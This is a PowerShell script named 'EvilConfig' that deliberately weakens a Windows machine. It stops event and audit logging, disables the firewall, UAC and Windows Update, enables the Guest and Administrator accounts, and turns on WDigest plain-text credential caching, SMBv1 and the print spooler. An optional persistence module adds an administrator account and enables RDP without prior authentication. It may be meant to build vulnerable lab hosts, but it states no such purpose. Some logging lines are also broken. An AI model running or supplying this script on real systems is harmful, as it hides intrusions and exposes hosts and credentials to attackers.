# AUTHOR: Anna Pratt
# VERSION: 1.0
# DATED: May 2025

# Parse arguments from the command line when the script is invoked
$arg0=$args[0]
$arg1=$args[1]

# This string will contain notes of every information performed by the script.
# The log will only be written to the configs.txt file if the --log flag is set.
$logString = ""



function defenseEvasion {

    log -Info "---------- DEFENSE EVASTION ----------"

    #Stop Windows Event logging and audit policy logging. Source https://viperone.gitbook.io/pentest-everything/everything/everything-active-directory/defense-evasion/impair-defenses/disable-windows-event-logging
    try {
        Stop-Service -Name EventLog -Force
        $logString = $logString +  "Windows event logging disabled. `n"
    }
    catch {
        $logString = $logString +  "ERROR: Unable to stop Windows Event logging `n"
    }

    auditpol.exe /clear /y
    auditpol.exe  /remove /allusers
    $logString = $logString +  "Audit policy logging disabled.`n"

    #Disable Firewall Logging for all Firewall profiles
    Set-NetFirewallProfile -Profile Domain,Public,Private -LogBlocked False -LogAllowed False -LogIgnored False
    $logString = $logString +  "Firewall logging disabled.`n"

    # Disable all Firewall profiles
    Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False
    $logString = $logString +  "Windows Firewall disabled. `n"

}

function weakeningHost {
    $logString = $logString +  "---------- WEAKENING ---------- `n"

    #Set PowerShell policy to run any scripts from the internet (Unrestricted)
    Set-ExecutionPolicy Unrestricted
    $logString = $logString +  "PowerShell Exeuction Policy set to Unrestricted.1`n"

    #Disable UAC. Source https://github.com/nitroz3us/disable-windows-defender/blob/main/disable-windows-defender.ps1
    New-ItemProperty -Path HKLM:Software\Microsoft\Windows\CurrentVersion\policies\system -Name EnableLUA -PropertyType DWord -Value 0 -Force
    $logString = $logString +  "UAC disabled.`n"

    #Enable the default local users
    Get-LocalUser -Name "Administrator" | Enable-LocalUser
    $logString = $logString +  "Local Administrator user account enabled.`n"
    Get-LocalUser -Name "Guest" | Enable-LocalUser
    $logString = $logString +  "Local Guest user account enabled.`n"

    #Enable Wdigest for plain-text credential caching. Source https://thedfirreport.com/2022/06/06/will-the-real-msiexec-please-stand-up-exploit-leads-to-data-exfiltration/
    Set-ItemProperty -Force -Path  'HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' -Name  'UseLogonCredential' -Value '1'
    $logString = $logString +  "Wdigesst enabled.`n"

    #Enable SMBv1
    Enable-WindowsOptionalFeature -Online -FeatureName SMB1Protocol
    $logString = $logString +  "SMBv1 enabled.`n"

    #Enable Print Spooler
    Start-Service -Name spooler
    Set-Service -Name spooler -StartupType 'Automatic'
    $logString = $logString +  "Print spooler started, enabled on startup.`n"

    #Disable Windows Updates
    Set-Service wuauserv -Startup Disabled
    Stop-Service wuauserv -Force
    $logString = $logString +  "Windows Updates disabled.`n"

}

function showHelp {
    # Show help if the user uses the --help flag
    Write-Output "------------------------------------- EVILCONFIG -------------------------------------"
    Write-Output "This version of EvilConfig was made and tested on PowerShell version 5.1.26100.4061."
    Write-Output "You may encounter errors if using an older version of PowerShell."
    Write-Output ""
    Write-Output "OPTIONAL FLAGS:"
    Write-Output "--persist: Execute the persistence module, which performs the following:"
    Write-Output "      - Adds a local user (non-privileged) and adds a local user (privileged). You will be prompted for the user's passwords upon creation."
    Write-Output "      - Adds both of the new users to the local RDP allowed group."
    Write-Output "      - Installs SSH client for remote access."
    Write-Output "      - Installs TeamViewer for remote access."
    Write-Output "A stable internet connection is needed for the persistence module."
    Write-Output ""
    Write-Output "--log: Creates a configs.txt in the local directory with a list of configuration changes applied."
    Write-Output ""
    Write-Output "--------------------------------------------------------------------------------------"

}

function persist {
# Execute the persistence module if the user adds the persistence flag
    $logString = $logString + "---------- PERSISTENCE ----------"

    #Gather credentials to create a non-privileged local account
    $localUserName  = Read-Host -MaskInput "Enter the local (non-privileged) username: "
    $localPass = Read-Host -AsSecureString "Enter the local (non-privileged) password: "
    New-LocalUser -Name $localUserName -Password $localPass
    $logString = logString + "Local (non-privileged) user added: " + $localUserName + "`n"

    #Gather credentials to create a privileged local account
    $adminUserName = Read-Host -MaskInput "Enter the local privileged username: "
    $adminPass = Read-Host -AsSecureString "Enter the local privileged password: "
    New-LocalUser -Name $adminUserName -Password $adminPass
    $logString = logString + "Local (privileged) user added: " + $adminUserName + "`n"

    # Add the privileged user to the local Administrators account
    Add-LocalGroupMember -Group "Administrators" -Member $adminUserName
    $logString = logString + "Local (privileged) user added to Administrators group: " + $localUserName + "`n"

    ## Add both new users to the RDP allowed group
    Add-LocalGroupMember -Group "Remote Desktop Users" -Member $localUserName
    Add-LocalGroupMember -Group "Remote Desktop Users" -Member $adminUserName
    $logString = $logString +   "Local users added to RDP group:" +  $localUserName + "," +  $adminUserName

    # Install SSH client on the host
   Add-WindowsCapability -Online -Name OpenSSH.Client~~~~0.0.1.0
    # Enable SSH service + modify the service to start automatically
   Start-Service sshd
   Set-Service -Name sshd -StartupType 'Automatic'
   $logString = $logString +  "SSH client installed, enabled to run on startup."

   #Enable RDP on the system
   # Registry keys taken from this Reddit thread: https://www.reddit.com/r/PowerShell/comments/8qbxn5/enabling_rdp/
    Set-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Terminal Server" -Name "fDenyTSConnections" -Value 0 #Value 0 means RDP is enabled
    Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" -Name "UserAuthentication" -Value 0 #Value 0 means RDP can be opened before authentication
    $logString = $logString +  "RDP enabled."
}


# Main Execution
$logString = $logString +  ".......... BEGINNING NEW CONFIG ............"

if ($arg0 -eq "--help") {
    showHelp
    Exit
}

defenseEvasion
weakeningHost

if ($arg0 -eq "--persist" -or $arg1 -eq "--persist" ) {

    persist
}

try {
    if ($arg0 -eq "--log" -or $arg1 -eq "--log" ) {
        Set-Content -Path "./configs.txt" -Value $logString
    } 
}
catch {
    Write-Output "ERROR: Unable to log."
}

Exit